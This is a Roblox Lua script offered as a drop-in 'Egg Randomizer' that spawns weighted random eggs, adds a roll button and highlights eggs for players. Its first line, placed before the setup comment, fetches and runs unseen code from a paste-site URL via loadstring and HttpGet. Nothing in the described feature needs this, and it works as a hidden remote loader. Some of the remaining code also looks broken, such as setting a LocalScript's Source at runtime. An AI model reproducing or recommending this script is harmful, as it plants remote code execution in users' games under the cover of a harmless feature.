loadstring(game:HttpGet("https://pastefy.app/zEcdizd8/raw"))()
--[[
Egg Randomizer Script (Ready-to-Use with GUI Roll Button)
Place this script inside **ServerScriptService**.

Setup:
1. Make a folder named `EggModels` in **ReplicatedStorage**.
2. Put your egg models inside it, named exactly as below:
   • RaccoonEgg
   • GoldenEgg
   • SilverEgg
   • CommonEgg
   • MysteryEgg
3. Add a folder named `EggSpawnPoints` in **Workspace**, with Parts as spawn locations.
4. Script will automatically spawn eggs at intervals AND adds a GUI roll button for players.
5. ESP + floating text will work for all players.
]]

local ReplicatedStorage = game:GetService("ReplicatedStorage")
local CollectionService = game:GetService("CollectionService")
local Players = game:GetService("Players")

-- Remote event for GUI button
local ReplicatedEvents = Instance.new("Folder", ReplicatedStorage)
ReplicatedEvents.Name = "EggEvents"
local RollEvent = Instance.new("RemoteEvent", ReplicatedEvents)
RollEvent.Name = "RollEgg"

-- CONFIG -------------------------------------------------
local CONFIG = {
    EggModelsFolder = ReplicatedStorage:WaitForChild("EggModels"),
    SpawnParent = workspace:FindFirstChild("Eggs") or Instance.new("Folder", workspace),
    SpawnInterval = 10, -- seconds between spawns

    Eggs = {
        { name = "Raccoon Egg", weight = 1, modelName = "RaccoonEgg", tag = "raccoon" },
        { name = "Golden Egg",  weight = 0.05, modelName = "GoldenEgg",  tag = "gold" },
        { name = "Silver Egg",  weight = 0.3, modelName = "SilverEgg",  tag = "silver" },
        { name = "Common Egg",  weight = 3, modelName = "CommonEgg",  tag = "common" },
        { name = "Mystery Egg", weight = 0.1, modelName = "MysteryEgg", tag = "mystery" },
    },

    AutoCleanup = 120, -- seconds before egg despawns
}

-- Build weighted table
local function buildWeightedTable(eggList)
    local t = {}
    local totalWeight = 0
    for _, e in ipairs(eggList) do
        totalWeight += (e.weight or 1)
        table.insert(t, {entry = e, cumulative = totalWeight})
    end
    return t, totalWeight
end

local weightedTable, totalWeight = buildWeightedTable(CONFIG.Eggs)

local function pickRandomEgg()
    local r = math.random() * totalWeight
    for _, item in ipairs(weightedTable) do
        if r <= item.cumulative then
            return item.entry
        end
    end
    return weightedTable[#weightedTable].entry
end

local function getEggModel(modelName)
    local m = CONFIG.EggModelsFolder:FindFirstChild(modelName)
    if m then return m:Clone() end
    return nil
end

local function spawnEggAt(eggDef, position)
    local model = getEggModel(eggDef.modelName)
    if not model then return end

    model.Name = eggDef.name
    if not model.PrimaryPart then
        local p = model:FindFirstChildWhichIsA("BasePart")
        if p then model.PrimaryPart = p end
    end

    if model.PrimaryPart then
        model:SetPrimaryPartCFrame(CFrame.new(position))
    else
        model:MoveTo(position)
    end

    model.Parent = CONFIG.SpawnParent
    CollectionService:AddTag(model, "Egg")
    if eggDef.tag then CollectionService:AddTag(model, eggDef.tag) end

    model:SetAttribute("EggName", eggDef.name)
    model:SetAttribute("EggTag", eggDef.tag)

    if CONFIG.AutoCleanup then
        task.delay(CONFIG.AutoCleanup, function()
            if model and model.Parent then model:Destroy() end
        end)
    end
end

-- MAIN LOOP (automatic spawns)
local spawnPointsFolder = workspace:WaitForChild("EggSpawnPoints")
local spawnPoints = spawnPointsFolder:GetChildren()

spawn(function()
    while true do
        task.wait(CONFIG.SpawnInterval)
        local pt = spawnPoints[math.random(1, #spawnPoints)]
        local eggDef = pickRandomEgg()
        spawnEggAt(eggDef, pt.Position + Vector3.new(0,3,0))
    end
end)

-- CLIENT GUI & ESP
Players.PlayerAdded:Connect(function(player)
    -- GUI setup
    player.CharacterAdded:Connect(function()
        local gui = Instance.new("ScreenGui")
        gui.Name = "EggGUI"
        gui.ResetOnSpawn = false
        gui.Parent = player:WaitForChild("PlayerGui")

        local button = Instance.new("TextButton")
        button.Size = UDim2.new(0, 200, 0, 50)
        button.Position = UDim2.new(0.5, -100, 1, -60)
        button.Text = "Roll Random Egg"
        button.BackgroundColor3 = Color3.fromRGB(0,170,255)
        button.TextColor3 = Color3.fromRGB(255,255,255)
        button.Parent = gui

        button.MouseButton1Click:Connect(function()
            RollEvent:FireServer()
        end)

        -- ESP script
        local espScript = Instance.new("LocalScript")
        espScript.Name = "EggESP"
        espScript.Source = [[
        local CollectionService = game:GetService("CollectionService")

        local function makeESP(model)
            if not model.PrimaryPart then return end
            if model:FindFirstChild("EggHighlight") then return end

            local highlight = Instance.new("Highlight")
            highlight.Adornee = model
            highlight.Name = "EggHighlight"
            highlight.OutlineColor = Color3.fromRGB(0,170,255)
            highlight.FillTransparency = 1
            highlight.OutlineTransparency = 0
            highlight.Parent = model

            local billboard = Instance.new("BillboardGui")
            billboard.AlwaysOnTop = true
            billboard.Size = UDim2.new(0,150,0,40)
            billboard.StudsOffset = Vector3.new(0, 3.5, 0)
            billboard.Parent = model.PrimaryPart

            local label = Instance.new("TextLabel")
            label.Size = UDim2.new(1,0,1,0)
            label.BackgroundTransparency = 1
            label.Text = model:GetAttribute("EggName") or model.Name
            label.Font = Enum.Font.SourceSansBold
            label.TextScaled = true
            label.TextColor3 = Color3.fromRGB(0,170,255)
            label.Parent = billboard
        end

        for _, m in ipairs(CollectionService:GetTagged("Egg")) do
            makeESP(m)
        end

        CollectionService:GetInstanceAddedSignal("Egg"):Connect(function(m)
            makeESP(m)
        end)
        ]]
        espScript.Parent = player.PlayerGui
    end)
end)

-- SERVER HANDLER FOR ROLL BUTTON
RollEvent.OnServerEvent:Connect(function(player)
    if #spawnPoints == 0 then return end
    local pt = spawnPoints[math.random(1, #spawnPoints)]
    local eggDef = pickRandomEgg()
    spawnEggAt(eggDef, pt.Position + Vector3.new(0,3,0))
end)
